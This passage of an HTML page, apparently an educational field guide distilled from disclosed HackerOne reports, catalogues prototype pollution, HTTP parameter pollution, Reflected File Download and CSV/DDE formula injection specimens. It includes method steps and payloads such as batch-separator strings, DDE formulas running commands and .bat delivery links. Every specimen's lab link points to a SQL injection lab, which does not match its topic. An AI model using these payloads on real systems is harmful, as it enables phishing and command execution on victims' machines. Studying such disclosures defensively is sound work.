+var payload = '{"__proto__":{"oops":"It works !"}}';
+var a = {};
+merge({}, JSON.parse(payload));
+console.log(a.oops); // =&gt; "It works !"</div>
+<p class="insight"><b>Insight —</b> Any JS merge/extend/clone/set-by-path over untrusted JSON is a prototype-pollution sink. Probe with {"__proto__":{"polluted":"x"}} (and constructor.prototype variant); confirm via ({}).polluted. Guaranteed DoS by clobbering toString/valueOf; chain to RCE via app-specific gadgets. Fix pattern to recognize as non-exploitable: Object.create(null) targets or explicit __proto__/constructor key filtering.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/311333" target="_blank" rel="noopener">hackerone.com/reports/311333</a></span><a class="src" href="#report-311333" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/sql-injection" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec hidden" id="report-298265" style="--sv:var(--sev-none)" data-sev="0" data-votes="65" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>HTTP Parameter Pollution via semicolon delimiter overrides iframe URL param</h3><span class="fieldmark">◆ Info</span></div>
+<div class="catalog">Specimen <b>#298265</b> · security · awarded · 65 votes · resolved</div>
+<div class="taxo"><span>Program <b>security</b></span><span>Surface <b>web</b></span><span>Tag <b>account-takeover</b></span></div>
+<h4>Root cause</h4><p style="margin:0">The gh_jid value was placed into an iframe src as the token param; because a semicolon is a legal query delimiter, injecting ';for=attacker' overrode the intended 'for' param and loaded an arbitrary external Greenhouse form for phishing.</p>
+<h4>Method</h4><ol><li>Find a value reflected into a URL where later params determine behavior</li><li>Inject a semicolon plus an overriding param into the reflected value</li><li>The downstream parser splits on ';' and honors your injected param</li></ol>
+<div class="pre">https://www.hackerone.com/careers?gh_jid=795069;for=airbnb
+# reflected into: boards.greenhouse.io/embed/job_app?...&amp;token=795069;for=airbnb&amp;...</div>
+<p class="insight"><b>Insight —</b> When HTML-escaping blocks &amp;, remember ';' is also a valid query delimiter (per W3C). Use it to smuggle/override parameters (HPP) into reflected URLs, iframes and downstream requests.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/298265" target="_blank" rel="noopener">hackerone.com/reports/298265</a></span><a class="src" href="#report-298265" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/sql-injection" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec hidden" id="report-105953" style="--sv:var(--sev-none)" data-sev="0" data-votes="62" data-bounty="500">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>HTTP parameter pollution overrides the shared URL in social-share buttons</h3><span class="fieldmark">◆ Info</span></div>
+<div class="catalog">Specimen <b>#105953</b> · security · USD 500 · 62 votes · resolved</div>
+<div class="taxo"><span>Program <b>security</b></span><span>Surface <b>web</b></span></div>
+<h4>Root cause</h4><p style="margin:0">The page reflects a query param into the share button's target URL without dedup/validation, so appending a second u= parameter pollutes the sharer link and the last value wins, causing the victim to share attacker-chosen content.</p>
+<h4>Method</h4><ol><li>Take a legit page URL that renders share buttons</li><li>Append &amp;u=ATTACKER_URL to it</li><li>When the victim clicks Share, the constructed facebook sharer.php?u=... carries the attacker's u= value</li></ol>
+<div class="pre">https://target.com/blog/post?&amp;u=https://attacker.example/
+# -&gt; https://www.facebook.com/sharer.php?u=https://target.com/blog/post?&amp;u=https://attacker.example/</div>
+<p class="insight"><b>Insight —</b> When user input flows into a downstream URL's query string, test HPP: add a duplicate of the sink's key and see which value the downstream parser honors (usually last). Useful for share-link spoofing, and as a primitive to smuggle params past a first parser.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/105953" target="_blank" rel="noopener">hackerone.com/reports/105953</a></span><a class="src" href="#report-105953" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/sql-injection" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec hidden" id="report-39658" style="--sv:var(--sev-none)" data-sev="0" data-votes="10" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Reflected File Download (RFD)</h3><span class="fieldmark">◆ Info</span></div>
+<div class="catalog">Specimen <b>#39658</b> · security · none · 10 votes · resolved</div>
+<div class="taxo"><span>Program <b>security</b></span><span>Surface <b>web</b></span><span>Chain <b>reflection + filename control -&gt; trusted-origin file down</b></span><span>Tag <b>account-takeover</b></span></div>
+<h4>Root cause</h4><p style="margin:0">An endpoint reflects user input into a JSON/text response, permits an attacker-chosen file extension in the path (e.g. append .bat), and is linked with a download attribute, so the browser saves attacker-controlled reflected content as an executable file appearing to originate from the trusted site.</p>
+<h4>Method</h4><ol><li>Find a reflecting endpoint (input echoed into the response body)</li><li>Inject a batch/shell payload into the reflected field</li><li>Append an executable extension to the URL path so the browser treats the response as a downloadable file</li><li>Serve an &lt;a download&gt; link; victim's download box shows the file as coming from the trusted domain; execution runs the payload</li></ol>
+<div class="pre"># reflected field value:
+text" || calc ||
+# craft URL with executable extension:
+https://TARGET/&lt;path&gt;/&lt;id&gt;.bat
+# delivery page:
+&lt;a href="https://TARGET/&lt;path&gt;/&lt;id&gt;.bat" download="invoice.cmd"&gt;Click to view&lt;/a&gt;</div>
+<p class="insight"><b>Insight —</b> RFD needs three ingredients: reflected input, attacker-controllable filename/extension, and a permissive download. Test any JSON/text endpoint by appending .bat/.cmd and injecting '|| cmd ||'. Works in Chrome/IE (Firefox ignores download attr).</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/39658" target="_blank" rel="noopener">hackerone.com/reports/39658</a></span><a class="src" href="#report-39658" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/sql-injection" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec hidden" id="report-99424" style="--sv:var(--sev-none)" data-sev="0" data-votes="9" data-bounty="1000">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>CSV/formula injection via profile name field</h3><span class="fieldmark">◆ Info</span></div>
+<div class="catalog">Specimen <b>#99424</b> · uber · USD 1000 · 9 votes · resolved</div>
+<div class="taxo"><span>Program <b>uber</b></span><span>Surface <b>web</b></span></div>
+<h4>Root cause</h4><p style="margin:0">User-supplied profile fields (driver first/last name) are exported into CSV without neutralizing leading formula characters, so a value like =1+1 is interpreted as a formula when staff open the export in a spreadsheet.</p>
+<h4>Method</h4><ol><li>Set a text field (name) to a formula payload starting with = + - @</li><li>Trigger the flow that exports data to CSV (e.g. request support to review the CSV)</li><li>When staff open it, the formula executes in their spreadsheet</li></ol>
+<div class="pre">=1+1
+=cmd|'/C calc'!A0</div>
+<p class="insight"><b>Insight —</b> Any user-controlled string that ends up in an exported CSV/XLSX (names, addresses, notes) is a formula-injection sink; test = + - @ leading chars. Also note mass-assignment: editable hidden fields (first_name) via DOM/param tampering.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/99424" target="_blank" rel="noopener">hackerone.com/reports/99424</a></span><a class="src" href="#report-99424" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/sql-injection" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec hidden" id="report-54034" style="--sv:var(--sev-none)" data-sev="0" data-votes="9" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Reflected File Download via JSON name reflection + download attribute</h3><span class="fieldmark">◆ Info</span></div>
+<div class="catalog">Specimen <b>#54034</b> · security · none · 9 votes · resolved</div>
+<div class="taxo"><span>Program <b>security</b></span><span>Surface <b>web</b></span></div>
+<h4>Root cause</h4><p style="margin:0">A JSON endpoint reflects an attacker-controlled account field verbatim; combined with the HTML5 download attribute, a link on the trusted domain downloads an executable batch file whose content is the reflected injected commands.</p>
+<h4>Method</h4><ol><li>Set a profile field to include shell separators (e.g. name with "||start chrome evil||)</li><li>Find an endpoint that reflects it, e.g. /user?format=json</li><li>Host an &lt;a download="x.bat"&gt; link pointing at that trusted-domain URL</li><li>Victim saves/runs the file, which appears to come from the trusted site</li></ol>
+<div class="pre">&lt;a href="https://TARGET/dsopas?format=json" download="HackerOneBonus.bat"&gt;Bonus App&lt;/a&gt;
+// injected field value: David Sopas"||start chrome websegura.net||</div>
+<p class="insight"><b>Insight —</b> RFD needs three things: a reflected user-controlled value, an endpoint the browser will treat as a download, and a filename with an executable extension (via download= or path/;/ tricks). Sanitize batch separators (|| &amp; ;) and force Content-Disposition with a fixed filename.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/54034" target="_blank" rel="noopener">hackerone.com/reports/54034</a></span><a class="src" href="#report-54034" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/sql-injection" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec hidden" id="report-1131887" style="--sv:var(--sev-none)" data-sev="0" data-votes="6" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>CSV/formula injection via stored attacker-controlled field exported to spreadsheet</h3><span class="fieldmark">◆ Info</span></div>
+<div class="catalog">Specimen <b>#1131887</b> · security · none · 6 votes · resolved</div>
+<div class="taxo"><span>Program <b>security</b></span><span>Surface <b>web</b></span><span>Tag <b>account-takeover</b></span></div>
+<h4>Root cause</h4><p style="margin:0">A value the attacker controls (program credential 'account details') is stored and later exported to CSV unescaped, so a leading formula character causes the spreadsheet app to execute it when the victim (program user) opens the export.</p>
+<h4>Method</h4><ol><li>As a lower-privileged user, set a stored field the victim will export to a formula payload</li><li>Wait for the privileged user to export the data to CSV and open it in Excel</li><li>The formula evaluates in the victim's spreadsheet (data exfil or, on legacy setups, command execution via DDE)</li></ol>
+<div class="pre">;=1+1;
+=cmd|'/C calc'!A0
+@SUM(1+1)*cmd|'/C calc'!A0
++ / - / = / @  leading chars trigger formula parsing</div>
+<p class="insight"><b>Insight —</b> Any field that is user-controlled AND ends up in an exported CSV/XLS is a formula-injection sink even if it is never rendered in the UI. Prefix payloads with = + - @ (and ; , tab). Defense: prefix dangerous leading chars with a single quote or wrap in quotes on export.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/1131887" target="_blank" rel="noopener">hackerone.com/reports/1131887</a></span><a class="src" href="#report-1131887" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/sql-injection" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec hidden" id="report-50658" style="--sv:var(--sev-none)" data-sev="0" data-votes="4" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Reflected File Download (RFD) from a JSON endpoint</h3><span class="fieldmark">◆ Info</span></div>
+<div class="catalog">Specimen <b>#50658</b> · security · none · 4 votes · resolved</div>
+<div class="taxo"><span>Program <b>security</b></span><span>Surface <b>web</b></span><span>Tag <b>supply-chain</b></span></div>
+<h4>Root cause</h4><p style="margin:0">A JSON endpoint reflects attacker-controlled input in its body and does not constrain the response Content-Type/filename, so a URL can be crafted (path segment forces a .bat filename) that the browser downloads as an executable batch file appearing to originate from the trusted domain; the reflected payload becomes shell commands when run.</p>
+<h4>Method</h4><ol><li>Find a reflective endpoint (JSON/API) whose output includes attacker input verbatim</li><li>Craft input that is valid batch syntax (e.g. contains ||command||)</li><li>Append a filename+extension via path/query so the download is saved as name.bat</li><li>Victim opens the file -&gt; commands run on their machine</li></ol>
+<div class="pre"># report/notification title used as the reflected value:
+hackerone"||calc||
+# delivery URL forces an executable filename served from the trusted origin:
+https://hackerone.com/notifications.bat</div>
+<p class="insight"><b>Insight —</b> RFD needs three things: reflected user input, a permissive filename (extra path segment ...notifications.bat), and a permissive Content-Type. Look for JSON/API responses that echo input; batch/CLI syntax embedded in that input turns a 'download' from a trusted domain into local command execution. Fix: strict respond_to/format enforcement returning 406 for non-JSON.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/50658" target="_blank" rel="noopener">hackerone.com/reports/50658</a></span><a class="src" href="#report-50658" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/sql-injection" target="_blank" rel="noopener">⚑ Lab</a></div></article></div>
+    <button class="loadmore" id="loadmore">Load more specimens (53 of 77 remaining)</button>
+    <h2 class="sec" id="refs"><span class="tick">§</span>References &amp; practice</h2>
+<ol class="refs">
+<li>PortSwigger Web Security Academy — <a href="https://portswigger.net/web-security/sql-injection" target="_blank" rel="noopener">SQL injection labs</a> (hands-on practice).</li>
+<li>All 77 disclosed reports for this class are catalogued as specimens above.</li>
+<li>See also: <a href="../chains.html">exploit chains</a> · <a href="../payloads.html">payload libraries</a> · <a href="../methodology/recon.html">methodology</a>.</li>
+</ol>
+  </main>
+  <nav class="toc" aria-label="In this entry"><h5>In this entry</h5><a href="#basic-information">Basic information</a><a href="#methodology">Methodology</a><a href="#injection-contexts">Injection contexts</a><a href="#nosql-operator-injection-mongodb" style="padding-left:24px">↳ NoSQL operator injection (MongoDB)</a><a href="#blind-nosql-regex-where-oracle" style="padding-left:24px">↳ Blind NoSQL ($regex / $where oracle)</a><a href="#prototype-pollution-deep-merge-deep-set-sinks" style="padding-left:24px">↳ Prototype pollution (deep-merge / deep-set sinks)</a><a href="#ldap-filter-injection" style="padding-left:24px">↳ LDAP filter injection</a><a href="#spreadsheet-formula-csv-dde-injection" style="padding-left:24px">↳ Spreadsheet formula / CSV-DDE injection</a><a href="#python-str-format-injection" style="padding-left:24px">↳ Python str.format() injection</a><a href="#jndi-lookup-injection-log4shell" style="padding-left:24px">↳ JNDI lookup injection (Log4Shell)</a><a href="#reference-hydration-resolver-injection" style="padding-left:24px">↳ Reference / hydration resolver injection</a><a href="#parser-differentials-dual-path-gaps" style="padding-left:24px">↳ Parser differentials &amp; dual-path gaps</a><a href="#bypasses">Bypasses</a><a href="#escalation-impact">Escalation &amp; impact</a><a href="#prevention">Prevention</a><a href="#tools">Tools</a><a href="#specimens">Specimens (77)</a><a href="#refs">References</a><h5 style="margin-top:22px">Practice</h5><a href="https://portswigger.net/web-security/sql-injection" target="_blank" rel="noopener">⚑ PortSwigger: SQL injection</a></nav>
+</div>
+<footer class="foot"><img class="seal" src="/favicon.jpg" alt="Logo"><span>The Hacktivity Field Guide — distilled from disclosed HackerOne reports for defensive, educational research. Every specimen cites <code>hackerone.com/reports/&lt;id&gt;</code>.</span></footer>
+<script src="../assets/app.js"></script></body></html>
